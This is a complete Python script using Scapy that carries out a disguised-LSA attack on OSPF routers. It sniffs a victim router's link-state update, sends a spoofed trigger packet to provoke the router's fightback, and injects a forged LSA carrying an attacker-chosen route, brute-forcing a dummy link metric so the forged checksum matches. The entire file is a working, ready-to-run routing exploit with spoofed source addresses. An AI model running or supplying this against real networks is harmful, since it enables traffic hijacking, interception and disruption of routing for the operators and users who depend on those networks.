#! /usr/bin/env python
import sys
import argparse

"""
Import Scapy avoiding error printing on the console.
"""
sys.stderr = None
from scapy.all import *
sys.stderr = sys.__stderr__

"""
Checks if the incoming packet is an OSFP LS Update packet
sent from the victim router.
"""
def check_incoming_packet(victim, pkt):
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim and pkt[IP].src == victim:
					return True
	return False

"""
Returns the position of the victim router LSA taken from the originally captured packet
"""
def get_victim_lsa_index(victim_ip, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim_ip:
					break
				position += 1
	return position

"""
OSPF Link "metric" field, used to fake the checksum.
"""
def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):

	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())

	"""
	 let's bruteforce it (using 65535 cycles, in the worst case).
	"""
	for metric in range (0,65535):
		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())

		if tmp_checksum == fightback_checksum:
			return metric

	return 0

if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")

	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victim_ip", help="[mandatory] The interface IP address of the victim router")
	parser.add_argument("-n", "--neighbor_ip", help="[mandatory] The IP to send the disguised LSA to (the neighbor of the victim router)")
	parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")

	args = parser.parse_args()

	if 	(args.victim_ip == None or
		args.iface == None or
		args.neighbor_ip == None):
		
		parser.print_help()
		sys.exit(1)
	
	# Initial configuration 							#

	"""
	victim routers
	"""
	victim_ip = args.victim_ip

	"""
	This is the IP address of a neighbor of the victim router, to which the disguised LSA is sent.
	"""
	
	neighbor_ip = args.neighbor_ip

	"""
	This is the interface to use for both sniffing and sending packets.
	"""
	iface = args.iface

	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	#####################################################
	# Sniffing for the original package					#
	#####################################################

	pkts = sniff(filter="proto ospf", iface=iface, stop_filter=lambda x: check_incoming_packet(victim_ip, x))

	pkt_orig = pkts[-1].copy()

	print("[+] Preparing trigger packet...")

	"""
	orignal packet
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim_ip, pkt_orig)

	"""
	the sequence of the LSA + 1.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1
	
	"""
	fake lsa
	"""
	trigger_link = OSPF_Link(	metric=1,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.66.0")

	"""
	Addition of the triggering OSPF Link in the trigger packet.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	Adjust source and destination MAC addresses...
	"""
	pkt_trig[Ether].src = None
	pkt_trig[Ether].dst = None

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""
	pkt_trig[IP].src = neighbor_ip
	pkt_trig[IP].dst = victim_ip
	pkt_trig[IP].chksum = None
	pkt_trig[IP].len = None
	pkt_trig[OSPF_Hdr].src = neighbor_ip
	pkt_trig[OSPF_Hdr].chksum = None
	pkt_trig[OSPF_Hdr].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	
	# Prepare the disguised packet 						#

	print("[+] Preparing disguised packet...")

	"""
	Get a fresh copy of the original packet.
	"""
	pkt_evil = pkts[-1].copy()

	"""
	Generate the disguised LSA. This is an example, change it accordingly to your
	goal.
	"""
	malicious_link = OSPF_Link(	metric=1,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.254.0")

	"""
	 malicious OSPF Link in the LSA_disguised packet.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	The sequence number of the packet evil is incremented by 2 because
	the trigger sequence is equal to the original packet sequence, plus one.
	It then triggers the fightback mechanism, which produces a packet with
	the sequence number equal to the trigger's sequence number, plus one.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	print("[+] Let's bruteforce the checksum!")

	"""
	Preparing the OSPF Link to fake the checksum.
	"""
	checksum_link = OSPF_Link(	metric=0,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.253.0")

	"""
	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)

	"""
	Compliance of the packet (increase size + nb link).
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	ORIGINAL SOLUTION:
	Get the value to modify the dummy link in order to have the same checksum as the fight back
	index of the dummy link - "metric":[1], "Tos":[3], "type":[4], "link_data":[5,6,7,8], "DR":[9,10,11,12]
	For example ind = [1,4], val = [49,12] -> metric = 49 and type =12

	IMPROVED SOLUTION:
	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),
	there is no need to change all the other parameters.
	"""
	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - 1

	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	faked_metric =  get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric

	print("[+] sending the pkts...")
	
	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	"""

	pkt_evil[IP].src = victim_ip
	pkt_evil[IP].dst = neighbor_ip
	pkt_evil[IP].chksum = None
	pkt_evil[IP].len = None
	pkt_evil[OSPF_Hdr].chksum = None
	pkt_evil[OSPF_Hdr].len = None
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	"""
	Send original packet to trigger the fightback mechanism and the disguised LSA package.
	"""
	sendp([pkt_trig,pkt_evil], iface=iface)